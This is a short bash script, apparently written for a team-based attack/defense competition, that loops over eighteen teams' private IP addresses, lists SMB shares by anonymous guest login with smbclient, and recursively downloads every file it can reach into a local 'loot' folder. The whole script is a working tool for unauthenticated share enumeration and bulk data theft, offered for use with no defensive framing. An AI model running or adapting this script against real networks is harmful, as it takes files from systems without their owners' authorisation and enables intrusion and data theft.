#!/bin/bash

for i in {1..18}; do
  # Absolute path for loot directory
  LOOT_DIR="$HOME/loot/team$i"
  mkdir -p "$LOOT_DIR"

  # Target IPs for this team
  team_ips=(
    "10.$i.1.1"
    "10.$i.1.2"
    "10.$i.1.3"
    "10.$i.1.12" 
    "192.168.$i.1" 
  )

  # Process each IP
  for ip in "${team_ips[@]}"; do
    echo -e "\n[🔍] Checking $ip for shares...\n"

    # Fetch shares
    shares=$(smbclient -L "$ip" -U 'guest' -N  2>/dev/null | grep Disk | awk '{print $1}')

    # Process each share
    for share in $shares; do
      echo -e "[📂] Found share: $share on $ip\n"
      
      SHARE_DIR="$LOOT_DIR/$share"
      mkdir -p "$SHARE_DIR"

      if [ -d "$SHARE_DIR" ]; then
        smbclient "//$ip/$share" -U 'guest' -N -c \
          "prompt off; recurse ON; lcd \"$SHARE_DIR\"; mget *" 2>/dev/null
        echo -e "[✅] Downloaded files from $share to: $SHARE_DIR\n"
      else
        echo -e "[❌] ERROR: Failed to create directory $SHARE_DIR. Skipping download.\n"
      fi
    done
  done
done

echo -e "\n[🎉] Script execution complete. Check $HOME/loot/ for results!\n"